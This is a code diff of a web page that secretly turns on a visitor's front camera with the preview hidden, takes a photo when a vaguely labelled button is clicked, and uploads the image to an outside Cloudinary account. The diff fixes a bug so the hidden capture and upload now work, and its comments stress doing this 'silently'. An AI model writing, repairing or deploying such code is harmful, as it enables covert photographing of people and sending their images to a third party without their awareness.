@@ -1,14 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Hidden Camera Capture</title>
+  <title>Hidden Auto Camera Capture</title>
 </head>
 <body>
-  <h2>📤 Hello</h2>
+  <button onclick="takePhoto()">📸 Capture</button>
 
-  <button onclick="takePhoto()">Click</button>
-
-  <!-- Hidden video element (camera preview) -->
+  <!-- Hidden elements -->
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -16,38 +14,35 @@
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
 
-    // ✅ Start camera silently (without showing preview)
+    // Auto start camera (hidden)
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => {
         video.srcObject = stream;
       })
       .catch(err => {
-        alert("Camera permission required.\n\n" + err);
+        alert("Camera access denied: " + err);
       });
 
-    // ✅ Capture photo on 1 tap
-    async function takePhoto() {
-      // Create capture canvas
+    // Capture photo & upload
+    function takePhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext("2d");
       ctx.drawImage(video, 0, 0);
 
-      // Convert to base64
-      const base64Image = canvas.toDataURL("image/jpeg");
+      canvas.toBlob(async function(blob) {
+        const formData = new FormData();
+        formData.append("file", blob, "photo.jpg");
+        formData.append("upload_preset", "photo_upload");
 
-      // Upload to Cloudinary
-      const formData = new FormData();
-      formData.append("file", file);
-      formData.append("upload_preset", "photo_upload");
+        const res = await fetch("https://api.cloudinary.com/v1_1/rajeevoberai39/image/upload", {
+          method: "POST",
+          body: formData
+        });
 
-      const res = await fetch("https://api.cloudinary.com/v1_1/rajeevoberai39/image/upload", {
-        method: "POST",
-        body: formData
-      });
-
-      const data = await res.json();
-      console.log("✅ Uploaded:", data.secure_url);
+        const data = await res.json();
+        console.log("✅ Uploaded:", data.secure_url);
+      }, "image/jpeg");
     }
   </script>
 </body>
